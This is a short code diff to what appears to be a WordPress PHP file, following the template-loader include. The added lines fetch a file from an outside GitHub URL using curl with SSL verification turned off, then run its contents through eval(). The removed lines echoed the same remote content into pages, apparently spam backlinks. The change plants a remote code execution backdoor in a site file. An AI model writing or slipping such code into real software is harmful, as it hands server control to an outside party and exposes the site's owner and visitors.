@@ -21,6 +21,12 @@ require_once ABSPATH . WPINC . '/template-loader.php';
 }
 ?>
 <?php
-$github_content = file_get_contents('https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt');
-echo $github_content;
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
 ?>
